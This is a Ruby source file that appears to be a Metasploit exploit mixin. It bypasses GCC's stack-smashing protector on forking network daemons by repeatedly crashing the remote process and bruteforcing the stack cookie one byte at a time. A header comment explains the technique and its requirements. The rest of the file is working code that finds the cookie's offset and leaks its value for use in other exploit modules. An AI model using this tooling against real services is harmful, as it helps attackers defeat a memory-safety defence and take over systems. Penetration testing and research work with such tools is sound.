module Msf

###
#
# Author: deadbyte@toucan-system.com
#
# This module provides an interface to help bypass GCC Stack-Smashing Protector
# (aka ProPolice) by bruteforcing the cookie value one byte at a time.
#
# This technique was first introduced by Ben Hawkes at Ruxcon 2006 [1]. It
# should work as is on most UNIX systems, including Linux and BSD variants,
# eventhough it only applies to a restricted set of stack-overflows. In
# particular, the following requirements are mandatory:
#
#   - overflow must occur in a child of a multithreaded daemon
#   - no call to execve when a new child is spawned
#   - no trailing byte must be added during the overflow
#
# If the daemon calls into execve, then every new child will have a new stack
# cookie value, making this approach useless.
#
# For example, some stack-overflows occuring in strcpy or fgets are not good
# candidates for this technique since both of those functions add a trailing
# byte which you don't control (respectively '\0' and '\n').  The direct result
# is you can't overwrite only one byte of the cookie at a time. On the other
# hand, some stack-overflows occuring in a call to memcpy or during a loop
# construct could be ideal candidates depending on the context.
#
# Basic usage example:
#
#     include Msf::Exploit::SSP
#
#     def deliver_payload (payload) ... code to deliver payload ...  end
#
#     cookie = leak_cookie_value
#
# The deliver_payload function takes a payload string, and returns true if the
# delivery succeeded, false otherwise (remote end crashed).
#
# Note: Please keep in mind this technique is not stealthy at all.  Leaking the
# stack cookie value requires crashing the remote process many times. For
# instance, applying this technique to a stack-overflow in Apache server would
# flood the error log with buffer-overflow alerts and stack traces from SSP.
#
# The total number of tries can go up to 256 * sizeof(cookie), that is 256*4 or
# 256*8 for x86 and x86_64 respectively. You also need to add to this value the
# number of tries needed to leak the cookie offset, which defaults to 512 max,
# but can be configured. 
#
# Worst case:
# x86:    256*4 + 512 = 1536 tries
# x86_64: 256*8 + 512 = 2560 tries
#
# For more information, see:
# [1] http://sota.gen.nz/hawkes_openbsd.pdf
# [2] http://www.phrack.org/issues.html?issue=67&id=13
# [3] http://en.wikipedia.org/wiki/Buffer_overflow_protection
#
###

module Exploit::SSP

	def initialize (info = {})

		super

		register_options(
		[
			OptBool.new('SSP',            [ false, 'Enable SSP bypass', false ]),
			OptInt.new('SSP::cookie_len', [ false, 'Length of stack cookie in bytes', 8 ]),
			OptInt.new('SSP::min_offset', [ false, 'Minimum offset to start cookie hunting', 1 ]),
			OptInt.new('SSP::max_offset', [ false, 'Maximum offset for cookie hunting', 512 ]),

		], self.class)
	end

	#
	# Method you need to implement to deliver the payload
	#
	def deliver_payload
		raise "Implement me"
	end

	#
	# Returns a random byte different from all BadChars
	#
	def rand_byte

		badchars = self.module_info['BadChars'] || ''
		
		loop do
			ch = rand(0xff)
			return ch unless badchars.include? ch.chr
		end
	end

	#
	# Leak offset from start of buffer to stack cookie
	#
	def leak_cookie_offset

		ch = rand_byte

		(datastore['SSP::min_offset']..datastore['SSP::max_offset']).each { |offset|

			next if deliver_payload(ch.chr * offset)

			# ok we crashed remote end, now let's backtrack with different
			# characters until it doesn't crash anymore to avoid the case where
			# the first bytes of the cookie are all equal to our initial random
			# value
			(1..datastore['SSP::cookie_len']).each { |i|

				offset -= 1
				ch = (ch + 1) & 0xff

				return offset if deliver_payload(ch.chr * offset)
			}

			break
		}

		print_status("Could not find stack cookie offset")
		return nil
	end

	#
	# Leak the next byte of the stack cookie given offset of cookie and previous
	# cookie bytes
	#
	def leak_cookie_byte (offset, bytes)

		pad = rand_byte.chr * offset
	
		(0x00..0xff).each { |byte|

			partial_cookie = bytes.dup << byte
			payload = pad + partial_cookie.pack("c*")
			return byte if deliver_payload(payload)
		}

		print_status("Could not leak cookie byte")
		return nil
	end

	#
	# Leak the whole stack cookie value
	#
	def leak_cookie_value

		bytes = []

		offset = leak_cookie_offset
		return nil if not offset

		print_status("Found stack cookie offset: #{offset}")

		(1..datastore['SSP::cookie_len']).each { |i|

			byte = leak_cookie_byte(offset, bytes)
			return nil if not byte

			print_status("Cookie[#{i - 1}] = %02x" % byte)
			bytes << byte
		}

		return bytes.pack('c*')
	end

end

end

